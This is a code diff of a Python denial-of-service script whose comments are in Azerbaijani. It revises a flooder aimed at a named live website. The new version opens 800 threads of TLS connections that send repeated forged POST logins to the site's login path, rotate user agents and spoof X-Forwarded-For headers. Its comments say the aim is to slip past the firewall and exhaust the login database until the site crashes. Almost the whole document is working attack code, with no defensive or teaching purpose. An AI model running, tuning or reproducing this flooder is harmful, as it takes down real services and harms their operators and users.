@@ -1,71 +1,75 @@
 import socket
+import ssl
 import threading
 import random
-import time
 import string
+import time
 
-# --- ÖLÜMCÜL AYARLAR ---
-# Saytın portu (HTTPS üçün 443, HTTP üçün 80)
-TARGET_HOST = "https://www.appl88-vip.com"
+TARGET_HOST = "www.appl88-vip.com"
 TARGET_PORT = 443
-THREADS = 500 # Railway-in internet kanalını sona qədər istifadə edir
-DURATION = 3600 # 1 Saatlıq hücum
+THREADS = 800 # Railway Paid üçün bu rəqəm daha effektivdir
+# Hədəf yol - login API-ni hədəf alırıq (ən ağır hissə)
+TARGET_PATH = "/#/login" 
 
-# Cloudflare-i daxildən yormaq üçün saxta paket
-def generate_payload():
-    method = random.choice(["GET", "POST", "HEAD"])
-    path = "/" + "".join(random.choices(string.ascii_lowercase + string.digits, k=15))
-    headers = (
-        f"{method} {path} HTTP/1.1\r\n"
+def get_random_headers():
+    # Saytı reklam trafiki kimi göstəririk ki, firewall şübhələnməsin
+    ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
+    forwarded_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    
+    payload = (
+        f"POST {TARGET_PATH} HTTP/1.1\r\n"
         f"Host: {TARGET_HOST}\r\n"
-        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
-        f"Accept: */*\r\n"
+        f"User-Agent: {ua}\r\n"
+        f"Accept: application/json, text/plain, */*\r\n"
+        f"Content-Type: application/json;charset=UTF-8\r\n"
+        f"X-Forwarded-For: {forwarded_ip}\r\n"
+        f"Referer: https://{TARGET_HOST}/\r\n"
         f"Connection: keep-alive\r\n"
-        f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
+        f"Content-Length: {random.randint(100, 500)}\r\n"
         f"\r\n"
+        f"{'{\"username\":\"' + ''.join(random.choices(string.ascii_lowercase, k=10)) + '\",\"password\":\"' + ''.join(random.choices(string.digits, k=8)) + '\"}'}"
     ).encode()
-    return headers
+    return payload
 
 def attack():
+    # SSL context-i bir dəfə yarat ki, CPU yorulmasın
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
     while True:
         try:
-            # Birbaşa TCP Socket səviyyəsində bağlantı
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
+            s.settimeout(5)
             
-            # HTTPS (SSL) bağlantısı təqlid edilir
-            import ssl
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            
-            conn = context.wrap_socket(s, server_hostname=TARGET_HOST)
+            # Bağlantını qur
+            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
             
-            # Saniyədə yüzlərlə paketi eyni bağlantıdan darvazadan keçirt!
-            for _ in range(100):
-                conn.send(generate_payload())
+            # "Rapid Fire" - Bir bağlantıdan 50 ağır POST sorğusu
+            for _ in range(50):
+                conn.send(get_random_headers())
+                # Çox qısa gözləmə (Serverin buferini doldurmaq üçün)
+                time.sleep(0.01)
                 
             conn.close()
         except:
             pass
 
 def main():
-    print(f"💀 HYPER-NOVA ACTIVATED: {TARGET_HOST}")
-    print(f"[*] Total Threads: {THREADS} | Protocol: TCP/SSL")
+    print(f"🔥 VIP DESTROYER ACTIVATED: {TARGET_HOST}")
+    print("[*] Specializing in API and Login DB exhaustion...")
     
-    threads = []
     for i in range(THREADS):
         t = threading.Thread(target=attack)
         t.daemon = True
-        threads.append(t)
         t.start()
-        if i % 50 == 0:
-            print(f"[*] {i} Döyüşçü cəbhəyə göndərildi...")
-            time.sleep(0.5)
+        if i % 100 == 0:
+            print(f"[*] {i} API Flooders deployed...")
+            time.sleep(1)
 
-    print("\n🔥 BÜTÜN QÜVVƏLƏR AKTİVDİR! SAYTIN ÇÖKMƏSİNİ GÖZLƏYİN.")
-    time.sleep(DURATION)
+    while True:
+        time.sleep(1)
 
 if __name__ == "__main__":
     main()
